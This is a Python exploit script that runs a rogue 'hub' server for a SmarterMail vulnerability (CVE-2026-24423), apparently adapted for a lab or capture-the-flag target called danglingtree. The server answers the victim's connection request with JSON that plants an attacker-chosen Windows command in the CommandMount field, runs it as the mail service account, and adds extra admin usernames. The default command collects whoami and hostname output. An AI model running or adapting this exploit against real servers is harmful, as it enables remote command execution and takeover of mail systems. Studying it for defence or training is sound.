#!/usr/bin/env python3
"""SmarterMail ConnectToHub fake hub (CVE-2026-24423) — adapted for danglingtree."""
from http.server import BaseHTTPRequestHandler, HTTPServer
import json, sys, uuid

# Command executed as svc_mail via SystemMount.CommandMount
# Default: reverse-friendly write + whoami
CMD = sys.argv[1] if len(sys.argv) > 1 else (
    r'cmd /c whoami > C:\Windows\Temp\svc_whoami.txt & '
    r'whoami /all > C:\Windows\Temp\svc_whoami_all.txt & '
    r'hostname >> C:\Windows\Temp\svc_whoami.txt'
)
HOST = sys.argv[2] if len(sys.argv) > 2 else "0.0.0.0"
PORT = int(sys.argv[3]) if len(sys.argv) > 3 else 8082

class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print(f"[hub] {self.address_string()} {fmt % args}", flush=True)

    def _send_json(self, code: int, obj: dict):
        data = json.dumps(obj).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        self._send_json(200, {"ok": True, "cmd": CMD})

    def do_POST(self):
        # Accept both known paths
        length = int(self.headers.get("Content-Length", "0") or 0)
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        print(f"[*] POST {self.path}", flush=True)
        print(f"[*] Body: {body}", flush=True)

        if "setup-initial-connection" not in self.path and "connect" not in self.path.lower():
            print(f"[!] unexpected path, still answering hub payload", flush=True)

        # Unique MountPath each time so CommandMount re-fires
        mount = r"C:\Windows\Temp\sm_" + uuid.uuid4().hex[:8]
        resp = {
            "ClusterID": str(uuid.uuid4()),
            "SharedSecret": "any-value",
            "TargetHubs": {"a": "b"},
            "IsStandby": False,
            "SystemMount": {
                "Enabled": True,
                "ReadOnly": False,
                # Don't mount C:\ — Temp is safer; C:\ may break service
                "MountPath": mount,
                "CommandMount": CMD,
            },
            "SystemAdminUsernames": ["admin", "poptart"],
        }
        print(f"[*] CommandMount => {CMD!r}", flush=True)
        print(f"[*] MountPath => {mount}", flush=True)
        self._send_json(200, resp)

def main():
    print(f"[*] Serving http://{HOST}:{PORT}", flush=True)
    print(f"[*] CMD={CMD!r}", flush=True)
    HTTPServer((HOST, PORT), Handler).serve_forever()

if __name__ == "__main__":
    main()
